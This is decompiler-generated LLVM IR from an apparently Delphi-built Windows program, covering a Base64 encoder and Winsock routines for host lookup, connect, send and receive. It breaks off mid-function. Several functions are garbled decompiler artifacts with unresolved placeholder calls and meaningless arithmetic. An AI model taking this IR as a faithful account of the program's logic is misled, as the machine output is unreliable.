define i32 @function_405348() local_unnamed_addr {
dec_label_pc_405348:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !843
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !843
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !843
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !844
  %2 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !845
  %3 = add i32 %2, 1, !insn.addr !845
  store i32 %3, i32* @global_var_4096a8, align 4, !insn.addr !845
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !846
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !847
  ret i32 0, !insn.addr !848
}

define i32 @function_40536d() local_unnamed_addr {
dec_label_pc_40536d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !849
  ret i32 %0, !insn.addr !849
}

define i32 @function_405372() local_unnamed_addr {
dec_label_pc_405372:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !850
}

define i32 @function_405374(i32 %arg1) local_unnamed_addr {
dec_label_pc_405374:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !851
}

define i32 @function_405378() local_unnamed_addr {
dec_label_pc_405378:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !852
  %2 = add i32 %1, -1, !insn.addr !852
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !852
  ret i32 %0, !insn.addr !853
}

define i32 @function_405383(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405383:
  %storemerge.reg2mem = alloca i32, !insn.addr !854
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !854
  %5 = inttoptr i32 %3 to i32*, !insn.addr !854
  store i32 %4, i32* %5, align 4, !insn.addr !854
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !855
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !855
  %10 = add i8 %7, %9, !insn.addr !855
  %11 = inttoptr i32 %8 to i8*, !insn.addr !855
  store i8 %10, i8* %11, align 1, !insn.addr !855
  %12 = load i32, i32* %eax, align 4, !insn.addr !856
  store i32 %arg1, i32* %eax, align 4, !insn.addr !857
  %13 = add i32 %12, 99, !insn.addr !858
  %14 = inttoptr i32 %13 to i64*, !insn.addr !858
  %15 = load i64, i64* %14, align 4, !insn.addr !858
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !858
  %17 = add i32 %16, -2, !insn.addr !859
  %18 = inttoptr i32 %17 to i16*, !insn.addr !859
  store i16 27241, i16* %18, align 2, !insn.addr !859
  %19 = mul i32 %2, 2, !insn.addr !860
  %20 = add i32 %2, 110, !insn.addr !860
  %21 = add i32 %20, %19, !insn.addr !860
  %22 = inttoptr i32 %21 to i32*, !insn.addr !860
  %23 = load i32, i32* %22, align 4, !insn.addr !860
  %24 = sext i32 %23 to i64, !insn.addr !860
  %25 = mul nsw i64 %24, 111, !insn.addr !860
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !860
  %28 = icmp eq i64 %25, %27, !insn.addr !860
  br i1 %28, label %dec_label_pc_4053b5, label %dec_label_pc_405424, !insn.addr !861

dec_label_pc_4053b5:                              ; preds = %dec_label_pc_405383
  %29 = icmp eq i32 %0, 0, !insn.addr !862
  br i1 %29, label %dec_label_pc_40542c, label %dec_label_pc_4053b9, !insn.addr !863

dec_label_pc_4053b9:                              ; preds = %dec_label_pc_4053b5
  %30 = icmp slt i32 %0, 0, !insn.addr !862
  br i1 %30, label %dec_label_pc_405434, label %dec_label_pc_4053bb, !insn.addr !864

dec_label_pc_4053bb:                              ; preds = %dec_label_pc_4053b9
  %31 = trunc i32 %0 to i8, !insn.addr !862
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !345, !insn.addr !862
  %33 = and i8 %32, 1, !insn.addr !862
  %34 = icmp eq i8 %33, 0, !insn.addr !862
  br i1 %34, label %dec_label_pc_4053ed, label %dec_label_pc_4053bd, !insn.addr !865

dec_label_pc_4053bd:                              ; preds = %dec_label_pc_4053bb
  %35 = add i32 %12, -1, !insn.addr !856
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !866
  %37 = load i32, i32* %36, align 4, !insn.addr !866
  %38 = xor i32 %37, %1, !insn.addr !866
  store i32 %38, i32* %36, align 4, !insn.addr !866
  %39 = add i32 %1, 959985462, !insn.addr !867
  %40 = inttoptr i32 %39 to i32*, !insn.addr !867
  %41 = load i32, i32* %40, align 4, !insn.addr !867
  %42 = xor i32 %41, %1, !insn.addr !867
  %43 = add i32 %16, -38, !insn.addr !868
  %44 = inttoptr i32 %43 to i32*, !insn.addr !868
  store i32 %35, i32* %44, align 4, !insn.addr !868
  %45 = add i32 %16, -42, !insn.addr !869
  %46 = inttoptr i32 %45 to i32*, !insn.addr !869
  store i32 %42, i32* %46, align 4, !insn.addr !869
  %47 = add i32 %16, -22, !insn.addr !870
  %48 = inttoptr i32 %47 to i32*, !insn.addr !870
  store i32 0, i32* %48, align 4, !insn.addr !870
  %49 = add i32 %16, -26, !insn.addr !871
  %50 = inttoptr i32 %49 to i32*, !insn.addr !871
  store i32 0, i32* %50, align 4, !insn.addr !871
  %51 = add i32 %16, -30, !insn.addr !872
  %52 = inttoptr i32 %51 to i32*, !insn.addr !872
  store i32 0, i32* %52, align 4, !insn.addr !872
  %53 = add i32 %16, -34, !insn.addr !873
  %54 = inttoptr i32 %53 to i32*, !insn.addr !873
  store i32 0, i32* %54, align 4, !insn.addr !873
  %55 = add i32 %16, -6, !insn.addr !874
  %56 = inttoptr i32 %55 to i32*, !insn.addr !874
  store i32 %arg3, i32* %56, align 4, !insn.addr !874
  %57 = add i32 %16, -46, !insn.addr !875
  %58 = inttoptr i32 %57 to i32*, !insn.addr !875
  store i32 %17, i32* %58, align 4, !insn.addr !875
  ret i32 0, !insn.addr !875

dec_label_pc_4053ed:                              ; preds = %dec_label_pc_4053bb
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !876
  %60 = trunc i64 %25 to i32, !insn.addr !860
  %61 = load i32, i32* %eax, align 4, !insn.addr !877
  %62 = add i32 %61, 1, !insn.addr !877
  %63 = mul i32 %59, 8, !insn.addr !878
  %64 = add i32 %59, 48, !insn.addr !878
  %65 = add i32 %64, %63, !insn.addr !878
  %66 = inttoptr i32 %65 to i8*, !insn.addr !878
  %67 = load i8, i8* %66, align 4, !insn.addr !878
  %68 = udiv i32 %62, 256, !insn.addr !878
  %69 = trunc i32 %68 to i8, !insn.addr !878
  %70 = add i8 %67, %69, !insn.addr !878
  store i8 %70, i8* %66, align 4, !insn.addr !878
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !879
  %71 = call i32 @"@LStrClr"(), !insn.addr !880
  %72 = call i32 @function_4034c8(), !insn.addr !881
  %73 = add i32 %60, -8, !insn.addr !882
  %74 = inttoptr i32 %73 to i32*, !insn.addr !882
  store i32 %72, i32* %74, align 4, !insn.addr !882
  %75 = ashr i32 %72, 31, !insn.addr !883
  %76 = zext i32 %72 to i64, !insn.addr !884
  %77 = zext i32 %75 to i64, !insn.addr !884
  %78 = mul i64 %77, 4294967296, !insn.addr !884
  %79 = or i64 %78, %76, !insn.addr !884
  %80 = sdiv i64 %79, 3, !insn.addr !884
  %81 = trunc i64 %80 to i32, !insn.addr !884
  store i32 %81, i32* %eax, align 4, !insn.addr !884
  %82 = srem i64 %79, 3, !insn.addr !884
  %83 = trunc i64 %82 to i32, !insn.addr !884
  %84 = icmp eq i32 %83, 0, !insn.addr !885
  %85 = icmp eq i1 %84, false, !insn.addr !886
  br i1 %85, label %dec_label_pc_405423, label %dec_label_pc_405416, !insn.addr !886

dec_label_pc_405416:                              ; preds = %dec_label_pc_4053ed
  %86 = load i32, i32* %74, align 4, !insn.addr !887
  %87 = ashr i32 %86, 31, !insn.addr !888
  %88 = zext i32 %86 to i64, !insn.addr !889
  %89 = zext i32 %87 to i64, !insn.addr !889
  %90 = mul i64 %89, 4294967296, !insn.addr !889
  %91 = or i64 %90, %88, !insn.addr !889
  %92 = sdiv i64 %91, 3, !insn.addr !889
  %93 = trunc i64 %92 to i32, !insn.addr !889
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !890
  br label %dec_label_pc_405430, !insn.addr !890

dec_label_pc_405423:                              ; preds = %dec_label_pc_4053ed
  ret i32 %81, !insn.addr !890

dec_label_pc_405424:                              ; preds = %dec_label_pc_405383
  %94 = load i32, i32* %eax, align 4, !insn.addr !891
  ret i32 %94, !insn.addr !891

dec_label_pc_40542c:                              ; preds = %dec_label_pc_4053b5
  %95 = load i32, i32* %eax, align 4, !insn.addr !892
  %96 = zext i32 %95 to i64, !insn.addr !892
  %97 = zext i32 %arg3 to i64, !insn.addr !892
  %98 = mul i64 %97, 4294967296, !insn.addr !892
  %99 = or i64 %98, %96, !insn.addr !892
  %100 = zext i32 %arg2 to i64, !insn.addr !892
  %101 = sdiv i64 %99, %100, !insn.addr !892
  %102 = trunc i64 %101 to i32, !insn.addr !892
  %103 = add i32 %102, 1, !insn.addr !893
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !893
  br label %dec_label_pc_405430, !insn.addr !893

dec_label_pc_405430:                              ; preds = %dec_label_pc_405416, %dec_label_pc_40542c
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !894
  ret i32 %104, !insn.addr !895

dec_label_pc_405434:                              ; preds = %dec_label_pc_4053b9
  %105 = inttoptr i32 %1 to i32*, !insn.addr !896
  %106 = load i32, i32* %105, align 4, !insn.addr !896
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !896
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !897
  %109 = load i32, i32* %108, align 4, !insn.addr !897
  %110 = add i32 %109, %107, !insn.addr !897
  store i32 %110, i32* %108, align 4, !insn.addr !897
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !898
  %113 = inttoptr i32 %112 to i8*, !insn.addr !898
  %114 = load i8, i8* %113, align 1, !insn.addr !898
  %115 = trunc i32 %111 to i8, !insn.addr !898
  %116 = add i8 %114, %115, !insn.addr !898
  store i8 %116, i8* %113, align 1, !insn.addr !898
  %117 = load i32, i32* %eax, align 4, !insn.addr !899
  ret i32 %117, !insn.addr !899
}

define i32 @function_40543c() local_unnamed_addr {
dec_label_pc_40543c:
  %ebx.0.reg2mem = alloca i32, !insn.addr !900
  %esp.0.reg2mem = alloca i32, !insn.addr !900
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !901
  %3 = inttoptr i32 %2 to i32*, !insn.addr !901
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !902
  %13 = inttoptr i32 %12 to i32*, !insn.addr !902
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !900
  br label %dec_label_pc_40543e, !insn.addr !900

dec_label_pc_40543e:                              ; preds = %dec_label_pc_405589, %dec_label_pc_40543c
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !903
  %25 = add i32 %24, 3, !insn.addr !904
  %26 = load i32, i32* %3, align 4, !insn.addr !901
  %27 = icmp sgt i32 %25, %26, !insn.addr !905
  br i1 %27, label %dec_label_pc_4054de, label %dec_label_pc_40544f, !insn.addr !905

dec_label_pc_40544f:                              ; preds = %dec_label_pc_40543e
  %28 = add i32 %24, %0, !insn.addr !906
  %29 = inttoptr i32 %28 to i8*, !insn.addr !906
  %30 = load i8, i8* %29, align 1, !insn.addr !906
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !907
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !908
  %34 = inttoptr i32 %33 to i8*, !insn.addr !908
  %35 = load i8, i8* %34, align 1, !insn.addr !908
  store i8 %35, i8* %5, align 1, !insn.addr !909
  %36 = load i8, i8* %29, align 1, !insn.addr !910
  %37 = mul i8 %36, 16, !insn.addr !911
  %38 = and i8 %37, 48, !insn.addr !912
  %39 = add i32 %28, 1, !insn.addr !913
  %40 = inttoptr i32 %39 to i8*, !insn.addr !913
  %41 = load i8, i8* %40, align 1, !insn.addr !913
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !914
  %44 = zext i8 %43 to i32, !insn.addr !914
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !915
  %46 = inttoptr i32 %45 to i8*, !insn.addr !915
  %47 = load i8, i8* %46, align 1, !insn.addr !915
  store i8 %47, i8* %7, align 1, !insn.addr !916
  %48 = load i8, i8* %40, align 1, !insn.addr !917
  %49 = mul i8 %48, 4, !insn.addr !918
  %50 = and i8 %49, 60, !insn.addr !919
  %51 = add i32 %28, 2, !insn.addr !920
  %52 = inttoptr i32 %51 to i8*, !insn.addr !920
  %53 = load i8, i8* %52, align 1, !insn.addr !920
  %54 = udiv i8 %53, 64, !insn.addr !921
  %55 = or i8 %54, %50, !insn.addr !922
  %56 = zext i8 %55 to i32, !insn.addr !922
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !923
  %58 = inttoptr i32 %57 to i8*, !insn.addr !923
  %59 = load i8, i8* %58, align 1, !insn.addr !923
  store i8 %59, i8* %9, align 1, !insn.addr !924
  %60 = and i8 %53, 63, !insn.addr !925
  %61 = zext i8 %60 to i32, !insn.addr !925
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !926
  %63 = inttoptr i32 %62 to i8*, !insn.addr !926
  %64 = load i8, i8* %63, align 1, !insn.addr !926
  store i8 %64, i8* %11, align 1, !insn.addr !927
  br label %dec_label_pc_405589, !insn.addr !928

dec_label_pc_4054de:                              ; preds = %dec_label_pc_40543e
  %65 = add i32 %24, 2, !insn.addr !929
  %66 = icmp sgt i32 %65, %26, !insn.addr !930
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_40554d, label %dec_label_pc_4054e8, !insn.addr !930

dec_label_pc_4054e8:                              ; preds = %dec_label_pc_4054de
  %76 = mul i8 %75, 16, !insn.addr !931
  %77 = and i8 %76, 48, !insn.addr !932
  %78 = add i32 %67, 1, !insn.addr !933
  %79 = inttoptr i32 %78 to i8*, !insn.addr !933
  %80 = load i8, i8* %79, align 1, !insn.addr !933
  %81 = zext i8 %80 to i32, !insn.addr !933
  %82 = udiv i8 %80, 16, !insn.addr !934
  %83 = or i8 %82, %77, !insn.addr !935
  %84 = zext i8 %83 to i32, !insn.addr !935
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !936
  %86 = inttoptr i32 %85 to i8*, !insn.addr !936
  %87 = load i8, i8* %86, align 1, !insn.addr !936
  store i8 %87, i8* %7, align 1, !insn.addr !937
  %88 = mul i32 %81, 4, !insn.addr !938
  %89 = and i32 %88, 60, !insn.addr !939
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !940
  %91 = inttoptr i32 %90 to i8*, !insn.addr !940
  %92 = load i8, i8* %91, align 4, !insn.addr !940
  store i8 %92, i8* %9, align 1, !insn.addr !941
  store i8 61, i8* %11, align 1, !insn.addr !942
  br label %dec_label_pc_405589, !insn.addr !943

dec_label_pc_40554d:                              ; preds = %dec_label_pc_4054de
  %93 = zext i8 %75 to i32, !insn.addr !944
  %94 = mul i32 %93, 16, !insn.addr !945
  %95 = and i32 %94, 48, !insn.addr !946
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !947
  %97 = inttoptr i32 %96 to i8*, !insn.addr !947
  %98 = load i8, i8* %97, align 16, !insn.addr !947
  store i8 %98, i8* %7, align 1, !insn.addr !948
  store i8 61, i8* %9, align 1, !insn.addr !949
  store i8 61, i8* %11, align 1, !insn.addr !950
  br label %dec_label_pc_405589, !insn.addr !950

dec_label_pc_405589:                              ; preds = %dec_label_pc_40554d, %dec_label_pc_4054e8, %dec_label_pc_40544f
  %99 = load i32, i32* %13, align 4, !insn.addr !902
  %100 = inttoptr i32 %99 to i32*, !insn.addr !951
  %101 = load i32, i32* %100, align 4, !insn.addr !951
  %102 = add i32 %esp.0.reload, -4, !insn.addr !951
  %103 = inttoptr i32 %102 to i32*, !insn.addr !951
  store i32 %101, i32* %103, align 4, !insn.addr !951
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !952
  %105 = load i32, i32* %15, align 4, !insn.addr !953
  %106 = add i32 %esp.0.reload, -8, !insn.addr !953
  %107 = inttoptr i32 %106 to i32*, !insn.addr !953
  store i32 %105, i32* %107, align 4, !insn.addr !953
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !954
  %109 = load i32, i32* %17, align 4, !insn.addr !955
  %110 = add i32 %esp.0.reload, -12, !insn.addr !955
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !955
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !956
  %113 = load i32, i32* %19, align 4, !insn.addr !957
  %114 = add i32 %esp.0.reload, -16, !insn.addr !957
  %115 = inttoptr i32 %114 to i32*, !insn.addr !957
  store i32 %113, i32* %115, align 4, !insn.addr !957
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !958
  %117 = load i32, i32* %21, align 4, !insn.addr !959
  %118 = add i32 %esp.0.reload, -20, !insn.addr !959
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !959
  %120 = call i32 @"@LStrCatN"(), !insn.addr !960
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !961
  %122 = load i32, i32* %23, align 4, !insn.addr !962
  %123 = add i32 %122, -1, !insn.addr !962
  %124 = icmp eq i32 %123, 0, !insn.addr !962
  store i32 %123, i32* %23, align 4, !insn.addr !962
  %125 = icmp eq i1 %124, false, !insn.addr !963
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !963
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !963
  br i1 %125, label %dec_label_pc_40543e, label %dec_label_pc_4055dd, !insn.addr !963

dec_label_pc_4055dd:                              ; preds = %dec_label_pc_405589
  %126 = load i32, i32* %119, align 4, !insn.addr !964
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !965
  store i32 4216319, i32* %111, align 4, !insn.addr !966
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !967
  ret i32 %127, !insn.addr !968
}

define i32 @function_4055f8() local_unnamed_addr {
dec_label_pc_4055f8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !969
  ret i32 %0, !insn.addr !969
}

define i32 @function_4055fd() local_unnamed_addr {
dec_label_pc_4055fd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !970
}

define i32 @function_4055ff(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4055ff:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !971
}

define i32 @function_405608() local_unnamed_addr {
dec_label_pc_405608:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !972
  %0 = call i32 @function_4036c8(), !insn.addr !973
  %1 = inttoptr i32 %0 to i8*, !insn.addr !974
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !975
  %3 = call i32 @"@FillChar"(), !insn.addr !976
  %4 = icmp eq %hostent* %2, null, !insn.addr !977
  br i1 %4, label %dec_label_pc_405653, label %dec_label_pc_405631, !insn.addr !978

dec_label_pc_405631:                              ; preds = %dec_label_pc_405608
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !975
  %6 = add i32 %5, 12, !insn.addr !979
  %7 = inttoptr i32 %6 to i32*, !insn.addr !979
  %8 = load i32, i32* %7, align 4, !insn.addr !979
  %9 = inttoptr i32 %8 to i32*, !insn.addr !980
  %10 = load i32, i32* %9, align 4, !insn.addr !980
  %11 = inttoptr i32 %10 to i8*, !insn.addr !981
  %12 = load i8, i8* %11, align 1, !insn.addr !981
  %13 = sext i8 %12 to i32, !insn.addr !982
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !983
  br label %dec_label_pc_405653, !insn.addr !983

dec_label_pc_405653:                              ; preds = %dec_label_pc_405631, %dec_label_pc_405608
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !984
}

define i32 @function_405664() local_unnamed_addr {
dec_label_pc_405664:
  %esp.0.reg2mem = alloca i32, !insn.addr !985
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !986
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !987
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !987
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !987
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !988
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !989
  %5 = trunc i32 %4 to i16, !insn.addr !989
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !990
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !991
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !991
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !992
  %9 = icmp eq i32 %8, -1, !insn.addr !993
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !994
  br i1 %9, label %dec_label_pc_4056f2, label %dec_label_pc_4056b3, !insn.addr !994

dec_label_pc_4056b3:                              ; preds = %dec_label_pc_405664
  %10 = call i32 @function_405608(), !insn.addr !995
  %11 = trunc i32 %10 to i16, !insn.addr !996
  %12 = call i16 @htons(i16 %11), !insn.addr !996
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !997
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !997
  %14 = sext i16 %12 to i32, !insn.addr !998
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !998
  %16 = icmp eq i32 %15, 0, !insn.addr !999
  %17 = icmp eq i1 %16, false, !insn.addr !1000
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1000
  br i1 %17, label %dec_label_pc_4056f2, label %dec_label_pc_4056ea, !insn.addr !1000

dec_label_pc_4056ea:                              ; preds = %dec_label_pc_4056b3
  %18 = inttoptr i32 %0 to i32*, !insn.addr !1001
  store i32 %8, i32* %18, align 4, !insn.addr !1001
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1002
  br label %dec_label_pc_4056f2, !insn.addr !1002

dec_label_pc_4056f2:                              ; preds = %dec_label_pc_4056ea, %dec_label_pc_4056b3, %dec_label_pc_405664
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1003
  %20 = load i32, i32* %19, align 4, !insn.addr !1003
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !1004
  %21 = add i32 %esp.0.reload, 8, !insn.addr !1005
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1005
  store i32 4216591, i32* %22, align 4, !insn.addr !1005
  %23 = call i32 @"@LStrClr"(), !insn.addr !1006
  ret i32 %23, !insn.addr !1007
}

define i32 @function_405708() local_unnamed_addr {
dec_label_pc_405708:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1008
  ret i32 %0, !insn.addr !1008
}

define i32 @function_40570d() local_unnamed_addr {
dec_label_pc_40570d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1009
}

define i32 @function_40570f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40570f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1010
}

define i32 @function_405718() local_unnamed_addr {
dec_label_pc_405718:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !1011
  %2 = call i32 @WSACleanup(), !insn.addr !1012
  ret i32 %2, !insn.addr !1013
}

define i32 @function_405724() local_unnamed_addr {
dec_label_pc_405724:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1014
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1015
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !1015
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !1015
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1016
  %4 = call i32 @function_4036c8(), !insn.addr !1017
  %5 = call i32 @StrCopy(), !insn.addr !1018
  %6 = call i32 @function_406f48(i32 4), !insn.addr !1019
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1020
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !1021
  %9 = call i32 @"@LStrClr"(), !insn.addr !1022
  ret i32 %9, !insn.addr !1023
}

define i32 @function_405795() local_unnamed_addr {
dec_label_pc_405795:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1024
  ret i32 %0, !insn.addr !1024
}

define i32 @function_40579a() local_unnamed_addr {
dec_label_pc_40579a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1025
}

define i32 @function_40579c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40579c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1026
}

define i32 @function_4057a4() local_unnamed_addr {
dec_label_pc_4057a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1027
  %2 = call i32 @StrPas(), !insn.addr !1028
  ret i32 %2, !insn.addr !1029
}

define i32 @function_4057d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4057d0:
  %esp.1.reg2mem = alloca i32, !insn.addr !1030
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1030
  %esp.0.reg2mem = alloca i32, !insn.addr !1030
  %ecx.0.reg2mem = alloca i32, !insn.addr !1030
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1031
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !1032
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1032
  br label %dec_label_pc_4057d9, !insn.addr !1032

dec_label_pc_4057d9:                              ; preds = %dec_label_pc_4057d9, %dec_label_pc_4057d0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1033
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1033
  store i32 0, i32* %2, align 4, !insn.addr !1033
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1034
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1034
  store i32 0, i32* %4, align 4, !insn.addr !1034
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1035
  %6 = icmp eq i32 %5, 0, !insn.addr !1035
  %7 = icmp eq i1 %6, false, !insn.addr !1036
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1036
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1036
  br i1 %7, label %dec_label_pc_4057d9, label %dec_label_pc_4057e0, !insn.addr !1036

